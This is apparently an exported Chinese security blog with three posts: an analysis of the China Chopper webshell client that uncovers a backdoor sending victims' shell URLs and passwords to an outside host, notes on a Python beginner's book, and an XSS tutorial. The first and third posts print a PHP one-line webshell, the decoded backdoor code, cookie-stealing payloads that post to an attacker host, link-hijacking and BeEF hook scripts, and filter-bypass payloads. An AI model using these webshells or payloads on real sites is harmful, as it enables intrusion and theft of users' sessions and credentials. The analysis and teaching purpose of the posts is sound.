    <url>/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="中国菜刀分析及隐藏后门"><a href="#中国菜刀分析及隐藏后门" class="headerlink" title="中国菜刀分析及隐藏后门"></a>中国菜刀分析及隐藏后门</h1><h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><h4 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h4><p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示。</p>
<h4 id="winsock-expert"><a href="#winsock-expert" class="headerlink" title="winsock expert"></a>winsock expert</h4><p> 一个用来监视和修改网络发送和接收数据的程序，WinSock Expert可以用来帮助您调试网络应用程序，分析网络程序的通信协议（如分析OICQ的发送接收数据），并且在必要的时候能够修改发送的数据。</p>
<h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>Wireshark是免费的网络协议检测分析程序。让您经由程序抓取运行的网站的相关资讯，包括每一封包流向及其内容、资讯可依操作系统语系看出,方便查看、监控TCP session动态等等。</p>
<h4 id="PEID"><a href="#PEID" class="headerlink" title="PEID"></a>PEID</h4><p>一款专业很好用的查壳软件，几乎可以侦测出所有的壳，其数量已超过470 种PE文档 的加壳类型和签名，另外还可识别出EXE文件是用什么语言编写的，比如：VC++、Delphi、VB或Delphi等。</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>我们通过peid等工具可以看出来加壳了：</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704224735501.png" alt="image-20200704224735501"></p>
<p>  通过winhex，也可以看到菜刀经过upx加壳处理：</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225123980.png" alt="image-20200704225123980"></p>
<p>进行脱壳处理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upx.exe -d 目标文件</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225645446.png" alt="image-20200704225645446"></p>
<p>再用peid查看，可以看到已经没有壳了，并且可以看出是vc++6.0编写</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225813247.png" alt="image-20200704225813247"></p>
<p>接下来把它的可见字符串打印出来看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.exe  caidao.exe</span><br></pre></td></tr></table></figure>
<p>由于字符串太多，我们可以有目的性地查找字符串如chopper</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string.exe  caidao.exe | findstr chopper</span><br></pre></td></tr></table></figure>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704230218566.png" alt="image-20200704230218566"></p>
<h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>在靶机上写一个php一句话放在网站的根目录下，如1.php,内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>然后在攻击机打开wireshark准备监听数据包，同时使用菜刀进行连接</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231058773.png" alt="image-20200704231058773"></p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231131527.png" alt="image-20200704231131527"></p>
<p> 监听到的数据包如下:</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231214377.png" alt="image-20200704231214377"></p>
<p>客户端在80端口上，以HTTP POST方式通讯，追踪tcp流来查看整个tcp数据交互过程。</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231350738.png" alt="image-20200704231350738"></p>
<p>红色部分为攻击机POST提交控制命令的内容，下面蓝色部分为靶机返回结果。</p>
<p>z0,z1,z2三个参数，我们分别解码。</p>
<p>到红色部分的代码经过base64以及url的编码，解码的顺序依次为url解码，然后再base64解码，得到明文</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231611163.png" alt="image-20200704231611163"></p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231643523.png" alt="image-20200704231643523"></p>
<p>明文如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">z0&#x3D;@ini_set(&quot;display_errors&quot;,&quot;0&quot;)@set_time_limit(0)@set_magic_quotes_runtime(0)echo(&quot;-&gt;|&quot;);;$p&#x3D;base64_decode($_POST[&quot;z1&quot;]);$s&#x3D;base64_decode($_POST[&quot;z2&quot;]);$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c &#39;&#123;$s&#125;&#39;&quot;:&quot;&#x2F;c &#123;$s&#125;&quot;;$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;@system($r.&quot; 2&gt;&amp;1&quot;);;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">z1&#x3D;cmd</span><br><span class="line">z2&#x3D;cd &#x2F;d &quot;D:\phpstudy\PHPTutorial\WWW\&quot;&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
<p>z1的值是cmd，z2的值是cd /d “c:\inetpub\wwwroot\”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]。该操作的意思就是执行输入的cmd命令，列出当前用户与当前目录，执行结果如下所示</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231838173.png" alt="image-20200704231838173"></p>
<p> 以上就是中国菜刀的流量通信的特征。</p>
<h2 id="带有恶意后门的菜刀"><a href="#带有恶意后门的菜刀" class="headerlink" title="带有恶意后门的菜刀"></a>带有恶意后门的菜刀</h2><p>打开带有恶意后门的菜刀，启动抓包软件WSockExpert，点击左上角的文件夹图标，选择caidao.exe，点击open即可</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232016543.png" alt="image-20200704232016543"></p>
<p> 接下来连接菜刀</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232052587.png" alt="image-20200704232052587"></p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232124638.png" alt="image-20200704232124638"></p>
<p>菜刀连接以后我们可以随意操作一下（比如点击、切换文件夹等，以此来产生通信流量方便我们后续的分析）</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232203249.png" alt="image-20200704232203249"></p>
<p>回到winsock expert</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232336587.png" alt="image-20200704232336587"></p>
<p>将下面的字符串解码，先URL解码</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232424476.png" alt="image-20200704232424476"></p>
<p>再base64解码</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232516342.png" alt="image-20200704232516342"></p>
<p>可以看到还是存在密文，那么接着解码</p>
<p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232605085.png" alt="image-20200704232605085"></p>
<p>明文如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if($_COOKIE[&#39;Lyke&#39;]!&#x3D;1)&#123;setcookie(&#39;Lyke&#39;,1);@file(&#39;http:&#x2F;&#x2F;www.7jyewu.cn&#x2F;hack.php?Url&#x3D;&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;REQUEST_URI&#39;].&#39;&amp;Pass&#x3D;&#39;.key($_POST));&#125;</span><br></pre></td></tr></table></figure>
<p>这里的http://[www.]7jyewu.cn/hack.php就是这个菜刀的后门地址。</p>
<p> HTTP_HOST就是我们拿到shell的网站，REQUEST_URI就是shell的URI,Pass就是我们菜刀连接一句话时的密码。这段代码的大概意思就是，会将我们拿到shell的网站的地址，密码等都通过后门传送给这个网站的所有者。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.hetianlab.com/expc.do?ce=20b72c3f-e7bc-406f-b0a3-7bbc977758e3" target="_blank" rel="noopener">https://www.hetianlab.com/expc.do?ce=20b72c3f-e7bc-406f-b0a3-7bbc977758e3</a> 全面分析中国菜刀及隐藏后门 </p>
<p><a href="https://webshell6.com/" target="_blank" rel="noopener">https://webshell6.com/</a>  2020免杀菜刀</p>
]]></content>
      <categories>
        <category>webshell</category>
      </categories>
      <tags>
        <tag>中国菜刀</tag>
      </tags>
  </entry>
  <entry>
    <title>python基础教程</title>
    <url>/2020/07/05/python%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="lt-Python基础教程-第3版-gt-读书笔记"><a href="#lt-Python基础教程-第3版-gt-读书笔记" class="headerlink" title="&lt;Python基础教程-第3版&gt;读书笔记"></a>&lt;Python基础教程-第3版&gt;读书笔记</h1><p>本书全本以python3为例</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h4 id="数和表达式"><a href="#数和表达式" class="headerlink" title="数和表达式"></a>数和表达式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">加减：2+2，4-2</span><br><span class="line"></span><br><span class="line">除法：运算结果是小数，即浮点数</span><br><span class="line">1&#x2F;2&#x3D;0.5</span><br><span class="line">1&#x2F;1&#x3D;1.0</span><br><span class="line"></span><br><span class="line">双斜杠：丢弃小数部分，执行整除运算</span><br><span class="line">1&#x2F;&#x2F;2&#x3D;0</span><br><span class="line">1&#x2F;&#x2F;1&#x3D;1</span><br><span class="line">10&#x2F;&#x2F;3&#x3D;3</span><br><span class="line">10&#x2F;&#x2F;-3&#x3D;-4 &#x2F;&#x2F;结果为负数时，圆整后将离0更远，向下圆整到-4</span><br><span class="line"></span><br><span class="line">求余(取模)运算符，x%y结果为x除以y的余数，即执行整除时余下的部分</span><br><span class="line">10&#x2F;&#x2F;3&#x3D;3</span><br><span class="line">10%3&#x3D;1</span><br><span class="line">9%3&#x3D;0</span><br><span class="line">10%-3&#x3D;-2</span><br><span class="line">-10%3&#x3D;2</span><br><span class="line"></span><br><span class="line">乘方求幂运算符</span><br><span class="line">-3**2&#x3D;-9</span><br><span class="line">(-3)**2&#x3D;9</span><br><span class="line">乘方的优先级比求负高，因此-3**2等价于-(3**2)</span><br></pre></td></tr></table></figure>
<h4 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">十六进制表示：0x</span><br><span class="line"></span><br><span class="line">八进制表示：0o</span><br><span class="line"></span><br><span class="line">二进制表示：0b</span><br></pre></td></tr></table></figure>
<h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>在python中，变量名称只能由字母、数字和下划线构成，且不能以数字开头。</p>
<p>变量即表示特定值的名称</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x&#x3D;3表示赋值</span><br><span class="line">使用python变量前必须赋值</span><br></pre></td></tr></table></figure>
<h4 id="获取用户输入"><a href="#获取用户输入" class="headerlink" title="获取用户输入"></a>获取用户输入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">input</span><br><span class="line">如x&#x3D;input(&quot;x:&quot;)</span><br></pre></td></tr></table></figure>
<h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>python提供了大量的内置函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">乘方 pow</span><br><span class="line">绝对值 abs</span><br></pre></td></tr></table></figure>
<h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p>可将模块视为扩展，导入扩展python功能。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">导入模块命令：import</span><br><span class="line"></span><br><span class="line">通过使用import的变种from moudle import function，可在调用函数时不指定模块前缀:</span><br><span class="line">from math import sqrt</span><br><span class="line"></span><br><span class="line">nan具有特殊含义，指的是非数值</span><br></pre></td></tr></table></figure>
<h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p>在命令提示符下运行脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python xxx.py</span><br></pre></td></tr></table></figure>
<p>在Linux中运行脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">脚本第一行 #! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">要像普通程序一样运行：chmod +x hello.py即可</span><br></pre></td></tr></table></figure>
<p>注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在python中，#为注释，在代码中，井号后面到行尾的内容都将被忽略。</span><br></pre></td></tr></table></figure>
<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>单引号、双引号、三引号都可以表示字符串，其中三引号可表示换行的长字符串。</p>
<p>字符串转义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;可对字符串进行转义，如</span><br><span class="line">&#39;Let\&#39;s go&#39;经过转义，里面的引号不会被认为是字符串结束符，输出为&#39;Let&#39;s go&#39;</span><br></pre></td></tr></table></figure>
<p>原始字符串</p>
<p>对于很长的路径，将使用大量的反斜杠。可使用原始字符串，因为原始字符串不会对反斜杠做特殊处理，会让字符串包含的每个字符都保持原样，用前缀 r 表示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(r&#39;C:\nextwhere&#39;)</span><br><span class="line">结果为C:\nextwhere</span><br></pre></td></tr></table></figure>
<h4 id="字节编码"><a href="#字节编码" class="headerlink" title="字节编码"></a>字节编码</h4><p>Python字符串使用Unicode编码来表示文本，几乎在所有情况下，最好使用UTF-8</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;hello word&quot;.encode(&quot;UTF-8&quot;)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞及防御</title>
    <url>/2020/07/05/XSS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E9%98%B2%E5%BE%A1/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS漏洞：</p>
<p>跨站脚本攻击，为了不和层叠样式表的CSS混肴，缩写为XSS。<br>恶意攻击者在浏览器web界面插入恶意script代码，当用户浏览该页面时，嵌入其中的script代码会被执行，从而达到恶意攻击用户的目的。</p>
<h2 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.反射型XSS</span><br><span class="line">反射型XSS的攻击往往具有一次性。</span><br><span class="line"></span><br><span class="line">2.存储型XSS</span><br><span class="line">持久性XSS，攻击脚本存储在目标服务器中，每次访问该页面的用户都会被攻击。</span><br><span class="line"></span><br><span class="line">3.DOM型XSS</span><br><span class="line">全称Document Object Model，使用DOM动态访问更新文档的内容、结构及样式。</span><br><span class="line">HTML标签都是节点，节点组成了节点树，通过HTML DOM可以对树上所有节点进行修改。</span><br></pre></td></tr></table></figure>
<h2 id="XSS盗取cookie"><a href="#XSS盗取cookie" class="headerlink" title="XSS盗取cookie"></a>XSS盗取cookie</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.cookie</span><br><span class="line">cookie是HTTP协议下，服务器维护用户信息的方式。cookie是由web服务器保存在用户浏览器上的小文本文件，包含相关用户信息。</span><br><span class="line">有些cookie是临时的，有的是持续的。临时的cookie只在浏览器上保存一段时间，一旦超过规定时间，该cookie就会被系统清除。</span><br><span class="line"></span><br><span class="line">服务器可以利用cookie包含信息的任意性来筛选并经常性维护这些信息，以判断在HTTP传输中的状态。</span><br><span class="line">cookies最典型的应用是判定注册用户是否已经登录网站，会提示用户是否保留用户信息以便下次登录。</span><br><span class="line"></span><br><span class="line">2.反射型XSS盗取cookie</span><br><span class="line">存在反射型XSS漏洞的站点，可以利用以下链接来盗取cookie：</span><br><span class="line">url?uanme&#x3D;&lt;script&gt;document.location&#x3D;&#39;http:&#x2F;&#x2F;ip&#x2F;cookie.php?cookie&#x3D;&#39;+docunment.cookie&lt;&#x2F;script&gt;</span><br><span class="line">将链接发送给用户，用户点击即触发XSS漏洞。</span><br><span class="line"></span><br><span class="line">cookie.php代码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cookie&#x3D;$_GET[&#39;cookie&#39;];</span><br><span class="line">file_put_contents(&#39;cookie.txt&#39;,$cookie);</span><br><span class="line">?&gt;</span><br><span class="line">http:&#x2F;&#x2F;xxx.xxx.com&#x2F;?name&#x3D;&lt;script&gt;docunment.location&#x3D;&#39;http:&#x2F;&#x2F;xxx.com&#x2F;cookie.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">3.利用cookie会话劫持</span><br><span class="line">打开偷到的cookie，找到cookie值，访问目标站点，修改cookie为偷到的cookie内容。</span><br><span class="line"></span><br><span class="line">3.劫持会话后的操作</span><br><span class="line">进入后台上传webshell；</span><br><span class="line">修改配置</span><br></pre></td></tr></table></figure>
<h2 id="XSS篡改网页链接"><a href="#XSS篡改网页链接" class="headerlink" title="XSS篡改网页链接"></a>XSS篡改网页链接</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.JS代码</span><br><span class="line">window.onload 当窗口加载时，执行匿名函数。</span><br><span class="line"></span><br><span class="line">使用for循环遍历所有获得的链接a标签:</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.onload&#x3D;function()&#123;</span><br><span class="line">var link&#x3D;cocument.getElmentsByTagName(&quot;a&quot;);</span><br><span class="line">for(j&#x3D;0;j&lt;link.length;j++)</span><br><span class="line">&#123;</span><br><span class="line">link[j].href&#x3D;&quot;http:&#x2F;&#x2F;attacker-site.com&quot;;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">2.XSS篡改链接</span><br><span class="line">将篡改的代码注入到对应的XSS位置。</span><br><span class="line"></span><br><span class="line">3.篡改链接指向流量网站</span><br><span class="line">刷流量，某些站点的重定向。</span><br><span class="line"></span><br><span class="line">4.篡改链接指向恶意URL</span><br><span class="line">使用Beef进行恶意链接生成，以及利用hook.js执行其他命令。</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;xxx.xx.xx.xx:xxx&#x2F;hook.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="XSS盗取用户信息"><a href="#XSS盗取用户信息" class="headerlink" title="XSS盗取用户信息"></a>XSS盗取用户信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.盗取用户信息原理</span><br><span class="line">克隆网站登录页面，利用存储XSS设置跳转代码，如果用户访问即跳转到克隆网站的登录页面，用户输入登录，用户名、密码被存储。</span><br><span class="line"></span><br><span class="line">2.setookit工具克隆网站</span><br><span class="line">kali自带社工工具。</span><br><span class="line"></span><br><span class="line">3.存储XSS跳转克隆网站</span><br><span class="line">XSS payload：</span><br><span class="line">&lt;script&gt;window.location&#x3D;&quot;http:&#x2F;&#x2F;xxx.x.x.xx&quot;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="没有过滤的XSS"><a href="#没有过滤的XSS" class="headerlink" title="没有过滤的XSS"></a>没有过滤的XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.实验环境</span><br><span class="line">https:&#x2F;&#x2F;xss-quiz.init21h.jp&#x2F;</span><br><span class="line">一个日本安全研究员制作的XSS练习靶场。</span><br><span class="line"></span><br><span class="line">2.html中文本标签b介绍</span><br><span class="line">&lt;b&gt;标签规定粗体文本。</span><br><span class="line"></span><br><span class="line">3.对该实验环境探测过程</span><br><span class="line">(1)构造一个不会识别为恶意代码的字符串提交到页面；</span><br><span class="line">(2)使用浏览器审查工具进行代码审查，寻找构造的字符串是否在页面中显示。</span><br><span class="line"></span><br><span class="line">4.闭合文本标签利用XSS</span><br><span class="line">简单payload：</span><br><span class="line">&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">闭合标签payload：</span><br><span class="line">&lt;&#x2F;b&gt;&lt;script&gt;alert(documnet.domain);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="属性中的XSS"><a href="#属性中的XSS" class="headerlink" title="属性中的XSS"></a>属性中的XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.配置Google关闭XSS-Auditor</span><br><span class="line">配置chrome --args --disable-xss-auditor</span><br><span class="line"></span><br><span class="line">2.属性中的XSS</span><br><span class="line">ctrl+F搜索特定的字符串</span><br><span class="line"></span><br><span class="line">3.闭合属性引入script</span><br><span class="line">原属性位置：&lt;input value&#x3D;&quot;&quot;&gt;</span><br><span class="line">闭合引号、尖括号，引入script脚本：</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(document.domain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">闭合属性引入事件触发XSS：</span><br><span class="line">&quot; onmouseover&#x3D;alert(document.domain)&gt;</span><br></pre></td></tr></table></figure>
<h2 id="选择列表中的XSS"><a href="#选择列表中的XSS" class="headerlink" title="选择列表中的XSS"></a>选择列表中的XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.HTML select标签介绍</span><br><span class="line">select元素可创建单选或多选菜单。</span><br><span class="line">&lt;select&gt;元素中的&lt;option&gt;标签用于定义列表中的可用选项。</span><br><span class="line"></span><br><span class="line">2.表单</span><br><span class="line">HTML表单用于搜集不同类型的用户输入。</span><br><span class="line"></span><br><span class="line">3.使用Burp进行测试</span><br><span class="line">使用Burpsuite截取HTTP请求，修改提交参数。</span><br><span class="line"></span><br><span class="line">4.闭合触发XSS</span><br><span class="line">&lt;&#x2F;option&gt;&lt;script&gt;alert(documnet.domain)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="选择参数中的XSS"><a href="#选择参数中的XSS" class="headerlink" title="选择参数中的XSS"></a>选择参数中的XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.HTML表单隐藏参数</span><br><span class="line">隐藏域是用来收集或发送信息的不可见元素，对于网页访问者来说，隐藏域是看不见的，当表单被提交时，隐藏域就会将信息用设置时定义的名称和值发送到服务器上。</span><br><span class="line"></span><br><span class="line">2.HTML中svg介绍</span><br><span class="line">SVG意为可缩放矢量图形，SVG使用XML格式定义图像。</span><br><span class="line">SVG文件可通过一下标签嵌入HTML文档:&lt;embed&gt;、&lt;object&gt;或&lt;iframe&gt;，也可使用svg标签插入。</span><br><span class="line">&lt;svg&#x2F;事件&#x3D;&quot;&quot;&gt;</span><br><span class="line"></span><br><span class="line">4.闭合触发XSS</span><br><span class="line">paylaod: &quot;&gt;&lt;svg onload&#x3D;alert(document.domain)&gt;%0a</span><br></pre></td></tr></table></figure>
<h2 id="限制长度的XSS"><a href="#限制长度的XSS" class="headerlink" title="限制长度的XSS"></a>限制长度的XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.HTML表单文本框</span><br><span class="line">HTML表单用于搜集不同类型的用户输入。表单元素指的是不同类型的input元素、复选框、单选按钮、提交按钮等。text定义常规文本输入。</span><br><span class="line"></span><br><span class="line">属性：</span><br><span class="line">value属性规定输入字段的初始值；</span><br><span class="line">readonly属性规定输入字段为只读(不能修改)；</span><br><span class="line">disabled属性规定输入字段是禁用的；</span><br><span class="line">size属性规定输入字段的尺寸(以字符计)；</span><br><span class="line">maxlength属性规定输入字段允许的最大长度，如设置maxlength属性，则输入控件不会接受超过所允许数的字符。</span><br><span class="line"></span><br><span class="line">2.XSS payload长度计算</span><br><span class="line">使用python内置函数len(字符串)计算对应的字节数。</span><br></pre></td></tr></table></figure>
<h2 id="JavaScript伪协议触发XSS"><a href="#JavaScript伪协议触发XSS" class="headerlink" title="JavaScript伪协议触发XSS"></a>JavaScript伪协议触发XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.javascript伪协议</span><br><span class="line">将javascript代码添加到客户端的方法就是把它放置在伪协议说明符javascript:后的URL中。</span><br><span class="line">这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。</span><br><span class="line">如果javascript：URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</span><br><span class="line">javascript:var new Date();&quot;&lt;h1&gt; The time is:&lt;&#x2F;h1&gt;&quot;+now;</span><br><span class="line"></span><br><span class="line">javascript URL还可以含有只执行动作，但不返回值的javascript语句.</span><br><span class="line">javascript:alert(&quot;hello world&quot;)</span><br><span class="line"></span><br><span class="line">2.a链接标签属性href</span><br><span class="line">&lt;a&gt;标签定义超链接，用于从一个页面链接到另一个页面；</span><br><span class="line">&lt;a&gt;元素最重要的属性是href属性，它指定链接的目标；</span><br><span class="line">在所有的浏览器中，链接的默认外观为：</span><br><span class="line">未被访问的链接带有下划线且是蓝色的；</span><br><span class="line">已被访问的链接带有下划线且是紫色的；</span><br><span class="line">活动链接带有下划线且是红色的。</span><br><span class="line"></span><br><span class="line">3.触发XSS</span><br><span class="line">payload:javascipt:alert(document.domain)</span><br></pre></td></tr></table></figure>
<h2 id="绕过过滤domain为空的XSS"><a href="#绕过过滤domain为空的XSS" class="headerlink" title="绕过过滤domain为空的XSS"></a>绕过过滤domain为空的XSS</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.XSS漏洞发现</span><br><span class="line">构造特殊无害字符串，响应中寻找字符串。</span><br><span class="line">绕过思路：寻找过滤内容</span><br><span class="line">绕过策略：双写绕过、编码绕过</span><br><span class="line"></span><br><span class="line">2.双写绕过</span><br><span class="line">payload:&quot;&gt;&lt;script&gt;alert(document.dodomainmain);&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">3.编码绕过</span><br><span class="line">payload:&quot;&gt;&lt;script&gt;eval(atob(&#39;YWXXXXXXXXX&#x3D;&#x3D;&#39;));&lt;&#x2F;script&gt;</span><br><span class="line">atob可将base64编码后的密文转化为明文。</span><br></pre></td></tr></table></figure>
